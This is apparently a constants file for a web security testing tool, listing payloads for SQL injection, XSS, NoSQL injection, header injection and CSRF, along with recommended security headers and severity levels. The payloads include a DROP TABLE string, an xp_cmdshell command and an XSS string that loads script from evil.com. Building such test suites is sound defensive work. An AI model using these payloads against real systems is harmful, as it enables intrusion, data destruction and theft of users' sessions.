export const SECURITY_PAYLOADS = {
  SQL_INJECTION: [
    "' OR '1'='1",
    '; DROP TABLE users --',
    "' UNION SELECT * FROM users --",
    '1; SELECT * FROM users',
    "admin' --",
    "' OR 1=1 --",
    "' OR 'x'='x",
    "1' OR '1'='1",
    '1 OR 1=1',
    "1' OR '1'='1' --",
    // Timing attack payloads
    "'; WAITFOR DELAY '0:0:5' --",
    "'; SELECT SLEEP(5) --",
    // More sophisticated payloads
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "'; EXEC xp_cmdshell('ping 10.10.10.10') --",
    // Blind SQL injection
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SUBSTRING(version(),1,1)='5'--",
    // Error-based SQL injection
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND updatexml(1,CONCAT(0x7e,version()),1)--",
  ],

  XSS: [
    "<script>alert('xss')</script>",
    "javascript:alert('xss')",
    "<img src='x' onerror='alert(1)'>",
    "<svg onload='alert(1)'>",
    "<iframe src='javascript:alert(1)'>",
    "'\"><script>alert('xss')</script>",
    "<body onload='alert(1)'>",
    "<a href='javascript:alert(1)'>click me</a>",
    "'-alert(1)-'",
    "\";alert('xss');//",
    // More sophisticated payloads
    "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
    '<svg><animate onbegin=alert() attributeName=x>',
    "';document.body.innerHTML=document.domain//",
    // DOM-based XSS
    "javascript:eval('var a=document.createElement('script');a.src='//evil.com/xss.js';document.body.appendChild(a)')",
    '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
    '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
    // Template injection
    '${alert(1)}',
    "{{constructor.constructor('alert(1)')()}}",
  ],

  NO_SQL_INJECTION: [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "sleep(5000)"}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    // More NoSQL specific payloads
    '{"$or": [{}, {"admin": true}]}',
    '{"password": {"$regex": "^a"}}',
    // MongoDB specific
    '{"$where": "function() { return true; }"}',
    '{"$where": "this.password.match(/.*/)"}',
    // Array manipulation
    '{"$push": {"admin": true}}',
    '{"$addToSet": {"roles": "admin"}}',
    // JavaScript injection
    '{"$where": "while(true){}"}',
    '{"$where": "db.loadServerScripts();return true;"}',
  ],

  HEADER_INJECTION: [
    'X-Forwarded-For: 127.0.0.1\r\nX-Custom-Header: injection',
    'Content-Length: 0\r\n\r\nGET /admin HTTP/1.1',
    'Host: evil.com',
    // HTTP Response Splitting
    'Header: value\r\n\r\nHTTP/1.1 200 OK\r\n',
    // Cache poisoning
    'X-Forwarded-Host: evil.com',
    'X-Forwarded-Proto: javascript:',
    // HTTP Request Smuggling
    'Content-Length: 0\r\nTransfer-Encoding: chunked',
    // Host header injection
    'Host: evil.com\r\nHost: real.com',
  ],

  CSRF: [
    '<form action="http://target.com/api/action" method="POST">',
    '<img src="http://target.com/api/action?param=value">',
    // CSRF with auto-submit
    `<form id="csrf-form" action="http://target.com/api/action" method="POST">
      <input type="hidden" name="param" value="value">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>`,
    // JSON CSRF
    `<form enctype='text/plain' method='POST' action='http://target.com/api/action'>
      <input name='{"param":"value","submit":"submit"}' type='hidden'>
    </form>`,
  ],
};

export const SECURITY_HEADERS = {
  REQUIRED: [
    'X-Content-Type-Options',
    'X-Frame-Options',
    'X-XSS-Protection',
    'Content-Security-Policy',
    'Strict-Transport-Security',
    'Referrer-Policy',
  ],
  RECOMMENDED: [
    'Feature-Policy',
    'Permissions-Policy',
    'Cross-Origin-Embedder-Policy',
    'Cross-Origin-Opener-Policy',
    'Cross-Origin-Resource-Policy',
  ],
  VALUES: {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Content-Security-Policy': "default-src 'self'",
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Feature-Policy': "camera 'none'; microphone 'none'",
    'Permissions-Policy': 'camera=(), microphone=()',
    'Cross-Origin-Embedder-Policy': 'require-corp',
    'Cross-Origin-Opener-Policy': 'same-origin',
    'Cross-Origin-Resource-Policy': 'same-origin',
  },
};

export const COMMON_VULNERABILITIES = {
  MISSING_HEADERS: 'Missing security headers',
  WEAK_HEADERS: 'Weak security header configuration',
  XSS_VULNERABLE: 'Cross-site scripting (XSS) vulnerability',
  SQLI_VULNERABLE: 'SQL injection vulnerability',
  NOSQLI_VULNERABLE: 'NoSQL injection vulnerability',
  CSRF_VULNERABLE: 'Cross-site request forgery (CSRF) vulnerability',
  HEADER_INJECTION_VULNERABLE: 'Header injection vulnerability',
  RATE_LIMIT_MISSING: 'Missing rate limiting',
  WEAK_AUTH: 'Weak authentication mechanism',
  TOKEN_EXPOSURE: 'Token exposure in responses',
  SENSITIVE_DATA: 'Sensitive data exposure',
  CORS_MISCONFIGURED: 'CORS misconfiguration',
};

export const SEVERITY_LEVELS = {
  CRITICAL: {
    description: 'Immediate action required - Critical security risk',
    examples: ['SQL injection', 'Remote code execution'],
  },
  HIGH: {
    description: 'Urgent action required - Significant security risk',
    examples: ['XSS', 'CSRF', 'Authentication bypass'],
  },
  MEDIUM: {
    description: 'Action required - Moderate security risk',
    examples: ['Missing security headers', 'Weak password policy'],
  },
  LOW: {
    description: 'Action recommended - Low security risk',
    examples: ['Information disclosure', 'Debug information exposure'],
  },
};
